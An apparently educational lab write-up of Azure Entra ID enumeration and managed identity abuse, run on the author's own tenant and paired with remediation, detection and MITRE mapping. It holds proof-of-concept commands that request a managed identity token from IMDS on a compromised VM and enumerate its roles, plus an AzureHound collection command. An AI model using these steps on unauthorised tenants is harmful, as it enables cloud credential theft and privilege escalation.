> **English** | [Italiano](README.md)

# Azure - Entra ID enumeration and managed identity abuse

> - **Phase:** Cloud Security - Azure (IaaS & PaaS)
> - **Visibility:** Medium - the activities on Entra ID and ARM are recorded in the Azure logs (Sign-in, Activity, Audit); the abuse of a managed identity via IMDS is quieter
> - **Prerequisites:** Azure/Entra credentials or access to a resource with a managed identity (e.g. a compromised VM); Azure CLI, AzureHound, ROADtools
> - **Output:** Finding CLOUD-003; map of Entra ID; managed identity token; path toward elevated privileges

- **Operating Environment:** Azure (author's lab tenant), Azure CLI, AzureHound
- **Main tools:** az cli, AzureHound, ROADtools, MicroBurst

---

## Executive summary

Azure organizes identity around **Entra ID** (the former Azure Active Directory), which makes Azure security deeply tied to the on-premise Active Directory concepts seen in module 07 - but transposed to the cloud. Whoever is familiar with AD enumeration (users, groups, roles, relationships) finds the same principles here, with BloodHound becoming AzureHound to map the attack paths in the tenant.

Azure's distinctive attack surface are the **Managed Identities**: identities automatically managed and assigned to resources (VMs, App Services, Functions) to access other services without hardcoded credentials. They are a good security practice, but if an attacker compromises the resource they can abuse them: by querying the **Instance Metadata Service (IMDS)** from the resource, they obtain a token of the managed identity and inherit its permissions. Finding CLOUD-003 documents this abuse, the Azure vector equivalent to the credential theft of the metadata service.

The principle remains the one common to the cloud: identity is the perimeter, and the misconfiguration of the permissions (managed identity with excessive roles, Entra ID with exploitable relationships) is the primary attack path.

---

## Folder structure

```
Azure/
+-- README.md      # this file: Entra ID enum + managed identity abuse (CLOUD-003)
+-- img/           # AzureHound graph and IMDS token
```

---

## Entra ID enumeration and managed identity abuse

**Finding ID:** `CLOUD-003` | **Severity:** `High` (managed identity abuse to inherit privileges; enumeration of Entra ID for the attack path in the tenant)

### Operational context

Two vectors combine. The enumeration of Entra ID (with AzureHound) maps users, groups, roles and relationships, revealing the paths toward elevated privileges - like BloodHound for on-premise AD. The managed identity abuse starts from a compromised resource: by querying the local IMDS, one obtains a token with the permissions of the identity assigned to the resource.

### PoC - theft of the managed identity token (from a compromised resource)

```Bash
# From a compromised Azure VM: request of a token to the metadata service (IMDS)
curl -s -H "Metadata: true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

```
{ "access_token": "eyJ0eXA...", "resource": "https://management.azure.com/" }
                                              <-- managed identity token (CLOUD-003)
```

### PoC - use of the token and permission enumeration

```Bash
# The token inherits the roles of the managed identity: enumeration of the accessible resources
az login --identity
az role assignment list --assignee <identity> -o table
```

```
Principal              Role           Scope
vm-managed-identity    Contributor    /subscriptions/.../rg-prod   <-- excessive role (CLOUD-003)
# "Contributor" on the entire resource group = control of all the resources
```

### PoC - Entra ID mapping (AzureHound)

```Bash
# AzureHound collects the data for BloodHound: attack paths in the tenant
azurehound -u user@tenant --tenant <id> list -o azure-data.json
# Import in BloodHound -> visualization of the paths toward Global Admin
```

### Remediation

- **Least privilege on the managed identities:** assign minimal roles with a restricted scope (not "Contributor" on the entire subscription); a compromised managed identity must not give control of the environment
- **IMDS protection:** limit the access to the metadata service from the workloads; monitor anomalous token requests
- **Entra ID hardening:** MFA, Conditional Access, review of the privileged roles (Global Admin, Privileged Role Admin); PIM (Privileged Identity Management) for just-in-time access
- **Detection:** audit with ScoutSuite/Prowler (multi-cloud); monitoring of the sign-in logs and ARM activities for anomalous patterns

---

## Lab experience

The continuity with module 07 (Active Directory) was the key to understanding. Entra ID is not a new world but the cloud transposition of AD: the same concepts of users, groups, roles and exploitable relationships, with AzureHound generating for BloodHound the same attack graphs. Whoever learned to map an AD domain finds the method here, adapted to the Microsoft Graph and ARM APIs. This made learning Azure faster than expected.

The managed identity abuse was the most instructive concept because it shows a good security control used against itself. Managed identities exist to eliminate hardcoded credentials - an excellent practice. But they transfer the trust to the resource: whoever compromises the VM inherits the identity. Querying the IMDS and obtaining a token with "Contributor" role made concrete that the security of the managed identity depends entirely on the scope of its permissions. A managed but over-privileged identity is convenient for the developer and for the attacker.

---

## Theoretical analysis: the trust transferred to the resource

Managed identities solve a real problem (hardcoded credentials) by moving the trust from the user to the resource: it is no longer "this person with this password", but "this VM, by the fact of being this VM". It is an elegant model, but it moves the risk instead of eliminating it. The secret is no longer in the code (where it could leak), but its replacement - the identity tied to the resource - is accessible to anyone who controls the resource. One trades the risk of secret leakage for the risk of resource compromise.

This defines the principle of defense: if the trust is in the resource, the scope of the resource's permissions is everything. A managed identity with a minimal role and restricted scope limits the damage of a compromised resource to that minimum; one with "Contributor" on the entire subscription turns the compromise of a single VM into control of the entire environment. Least privilege is not a detail but the only thing that separates a contained incident from a catastrophe, because the managed identity eliminates the leak of the secret but not the inheritance of the permissions.

---

## Real-World scenario: Post-Exploitation projection

> Attacker and defender perspectives.

### Attacker perspective (red team)

**Projected kill chain:**

```
[CLOUD-003] Compromised VM -> IMDS -> managed identity token (Contributor)
        |
        v
Control of the resource group: access to storage, DB, other VMs
        |
        v
AzureHound: path from Contributor toward Global Admin in the tenant
        |
        v
Compromise of the Entra ID tenant -> control of the entire cloud organization
```

**Potential impact:** in Azure, the compromise of Entra ID is equivalent to control of the entire cloud organization - identities, resources, data. The path VM, managed identity, escalation in the tenant is the vector that AzureHound makes visible and that an attacker traverses. The frequent hybrid integration between Entra ID and on-premise AD can extend the compromise to the traditional infrastructure too.

### Defender perspective (blue team)

**IOC:** anomalous IMDS requests from workloads; use of managed identity tokens from unexpected contexts; enumeration of Entra ID (AzureHound/Graph pattern); anomalous role assignments or sign-ins.

**Hardening:** least privilege and restricted scope on the managed identities; MFA and Conditional Access; PIM for just-in-time privileged access; continuous audit with ScoutSuite; monitoring of the sign-in and activity logs.

**Defensive lesson:** managed identities are a good practice only if accompanied by least privilege. Eliminating hardcoded credentials without limiting the identity's permissions moves the problem, does not solve it. In the cloud, every identity - human or managed - must be treated with least privilege, because each one is a potential escalation point.

---

## Reference tools

| tool | type | role | main use case |
| :--- | :--- | :--- | :--- |
| `az cli` | cloud cli | official | interaction with the azure/arm apis |
| `AzureHound` | attack path mapping | offensive | graph of the attack paths in entra id (bloodhound) |
| `ROADtools` | entra id recon | offensive | enumeration and analysis of entra id |
| `MicroBurst` | azure toolkit | offensive | service enumeration, managed identity abuse |
| `ScoutSuite` | multi-cloud audit | defensive | audit of the azure configuration |

> **Recommended modern tool:** `AzureHound` + BloodHound for the attack paths (the continuity with the AD of module 07), `MicroBurst` and `ROADtools` for the enumeration. Defensively `ScoutSuite` (`../../../Tooling/scoutsuite/`) for the multi-cloud audit.

---

## MITRE ATT&CK mapping

| tactic | technique | mitre id | action description |
| :--- | :--- | :--- | :--- |
| credential access | steal application access token | `T1528` | theft of the managed identity token via imds (CLOUD-003) |
| discovery | cloud infrastructure discovery | `T1580` | enumeration of entra id and the resources (CLOUD-003) |
| privilege escalation | valid accounts: cloud accounts | `T1078.004` | escalation via excessive managed identity roles |
| discovery | permission groups discovery: cloud groups | `T1069.003` | mapping of entra id roles and groups (azurehound) |

---

> **Note:** All documented activities were conducted on an Azure lab tenant owned by the author. Security testing on third-party tenants requires explicit authorization and compliance with Microsoft's terms. Techniques are documented for educational and authorized security assessment purposes.
